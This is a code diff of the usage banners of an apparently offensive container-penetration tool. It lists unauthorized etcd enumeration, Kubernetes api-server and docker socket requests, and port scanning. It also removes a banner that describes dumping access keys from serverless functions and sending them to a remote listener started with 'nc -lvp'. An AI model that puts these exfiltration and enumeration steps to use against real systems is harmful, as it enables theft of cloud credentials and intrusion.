@@ -55,13 +55,8 @@ var BannerContainerTpl = BannerHeader + `
   ckyn run <exploit> [<args>...]             Run single exploit.
 
 %s
-  vi <file>                                 Edit files in container like "vi" command.
-  ps                                        Show process information like "ps -ef" command.
-  netstat                                   Like "netstat -antup" command.
-  nc [options]                              Create TCP tunnel.
-  ifconfig                                  Show network information.
   kcurl <path> (get|post) <uri> [<data>]    Make request to K8s api-server.
-  ectl <endpoint> get <key>                 Unauthorized enumeration of ectd keys.
+  ectl <endpoint> get <key>                 Unauthorized enumeration of etcd keys.
   ucurl (get|post) <socket> <uri> <data>    Make request to docker unix socket.
   probe <ip> <port> <parallel> <timeout-ms> TCP port scan, example: ckyn probe 10.0.1.0-255 80,8080-9443 50 1000
 
@@ -80,23 +75,6 @@ var BannerContainer = fmt.Sprintf(
 	util.GreenBold.Sprint("Tool:"),
 	"Options:",
 )
-
-var BannerServerless = BannerHeader + `
-THIS IS THE SLIM VERSION FOR DUMPING SECRET/AK IN SERVERLESS FUNCTIONS.
-
-sessions in serverless functions will be killed in seconds, use this tool to dump AK/secrets in the fast way.
-
-Usage:
-ckyn-serverless <scan-dir> <remote-ip> <port>
-
-Args:
-scan-dir                 Read all files under target dir and dump AK token.
-remote-ip,port           Send results to target IP:PORT via TCP tunnel.
-
-Example:
-1. public server(e.g. 1.2.3.4) start listen tcp port 999 using "nc -lvp 999"
-2. inside serverless function service execute "./ckyn-serverless /code 1.2.3.4 999"
-`
 
 func parseDocopt() {
 	args, err := docopt.ParseArgs(BannerContainer, os.Args[1:], BannerVersion)
